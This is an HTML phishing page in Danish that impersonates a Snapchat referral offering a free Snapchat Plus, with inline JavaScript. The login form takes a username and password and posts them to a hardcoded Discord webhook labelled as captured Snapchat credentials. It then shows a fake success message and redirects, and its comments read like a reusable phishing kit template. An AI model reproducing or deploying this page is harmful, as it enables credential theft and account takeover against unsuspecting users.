<body>
    <div class="refer-container">
        <h2>Tilmeld dig Snapchat, så din ven kan få Snapchat Plus gratis!</h2>
        <p>Din ven har anbefalet dig til Snapchat. Log ind for at verificere og hjælpe dem med at låse op for Snapchat Plus gratis.</p>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Brugernavn" required>
            <input type="password" id="password" placeholder="Adgangskode" required>
            <button type="submit">Tilmeld dig Snapchat</button>
        </form>
        <div id="successMessage" class="success-message" style="display: none;">
            Du har nu tilmeldt dig. Tak!
        </div>
        <div id="countdownMessage" class="countdown" style="display: none;">
            Omdirigerer om (3)
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Send the credentials to your Discord webhook
            fetch('https://discord.com/api/webhooks/1440331213935214702/Wz1b1XpLzQfieOuq8tQc153FdD_4JjUZnOR3h6pLAO4lABE3RkQsnR7PC2JVZf0qD-is', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `Nye Snapchat-credentialer er fanget!\nBrugernavn: ${username}\nAdgangskode: ${password}`
                })
            })
            .then(response => response.json())
            .then(data => {
                // Show success message and countdown
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('countdownMessage').style.display = 'block';

                // Countdown and redirect to Google
                let count = 3;
                const countdownInterval = setInterval(() => {
                    count--;
                    document.getElementById('countdownMessage').innerText = `Omdirigerer om (${count})`;
                    if (count <= 0) {
                        clearInterval(countdownInterval);
                        window.location.href = 'google.com'; // Replace with your Is.gd shortened URL
                    }
                }, 1000);
            })
            .catch(error => {
                console.error('Error:', error);
                // Redirect to Google even if there is an error
                window.location.href = 'https://burgrhama.github.io/snapchat/'; // Replace with your Is.gd shortened URL
            });
        });
    </script>
